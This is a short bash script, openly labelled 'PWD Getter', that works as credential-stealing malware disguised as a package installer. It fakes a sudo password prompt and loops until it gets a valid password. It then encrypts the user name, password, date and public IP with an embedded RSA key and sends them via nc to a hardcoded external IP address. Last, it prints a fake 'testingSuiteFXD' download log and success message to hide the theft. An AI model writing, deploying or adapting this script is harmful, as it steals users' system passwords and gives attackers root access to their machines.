#!/bin/bash

# PWD Getter
sudo -k

read -sp "[sudo] password for $USER: " pwd < /dev/tty
echo ""
echo "$pwd" | sudo -S -v &>/dev/null

if ! sudo -n true 2>/dev/null; then
    # Attempt to authenticate using the provided password
    while ! sudo -n true 2>/dev/null; do
        echo "Sorry, try again."
        read -sp "[sudo] password for $USER: " pwd < /dev/tty
        echo "$pwd" | sudo -S -v &>/dev/null
        echo 
    done
fi

# Sends PWD off
msg="User: $USER // Pwd: $pwd // Date: $(date +"%Y/%m/%d - %I:%M:%S %p") // IP: $(curl -s ifconfig.me)"

read -r -d '' PUBLIC_KEY_PEM << 'EOF'
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA5tnShRnlJj6FYqSFvWIx
9TLf9bv04yRJc7SJ2gFoBQlvzoLVb9rHiTXxnWhSZXUYIEBPB0d6vlM9JZ9lDdhD
v4X6dNk0NDLrSZl6NGPfaKKCqM8mxy1DwHM2fZQa96Q7XKasHml3aEVZ4jbvLcPJ
rpJZKJ0ybYXMcsqr4p857thot9WBF1kotBV+vCYWu+PHI06eivsayPyPxpiLWPze
bvDcm+bjVlxsOgX73chh3bNlJbAqm29Zg0prYk+h6M0dRAsO6MogHh+453fa6WXL
k3of6J5QrRirURAO00J/YTAMEeyoBMVcuj+geUGE0A1SGZfMWvqy80e0uimNttan
CwIDAQAB
-----END PUBLIC KEY-----
EOF


ENCRYPTED_MSG=$(echo "$msg" | openssl pkeyutl -encrypt -pubin -inkey <(echo "$PUBLIC_KEY_PEM"))
BASE64_ENCRYPTED_MSG=$(echo "$ENCRYPTED_MSG" | base64 -w 0)

echo $BASE64_ENCRYPTED_MSG | nc -u -q 0 144.24.21.253 65432

unset pwd
# preps long msg

read -r -d '' brew_output <<EOF
Downloading testingSuiteFXD
[INFO] Disk space check: 54.2GB available. Proceeding.
testingSuiteFXD.tar.gz   [=====>                             ]  15%  41.2M  18.4MB/s   eta 12s
[WARN] Network jitter detected. Retrying packet 8491...
[WARN] Packet 8491 re-sent successfully.
testingSuiteFXD.tar.gz   [================>                  ]  51%   139M  17.9MB/s   eta 6s
[DEBUG] Flushing memory buffer to disk.
[DEBUG] Syncing file descriptor.
testingSuiteFXD.tar.gz   [=============================>     ]  89%   242M  19.1MB/s   eta 1s
[DEBUG] Received final packet. Assembling file.
testingSuiteFXD.tar.gz   [==================================>] 100%   271M  18.8MB/s   in 14.4s
EOF

# reads long msg slow

while IFS= read -r line; do
  echo "$line"
  sleep $(awk 'BEGIN{srand(); print 0.1 + rand() * 0.3}')
done <<< "$brew_output"


# sends short msg
echo Successfully installed testingSuiteFXD

#sleep 2
#clear
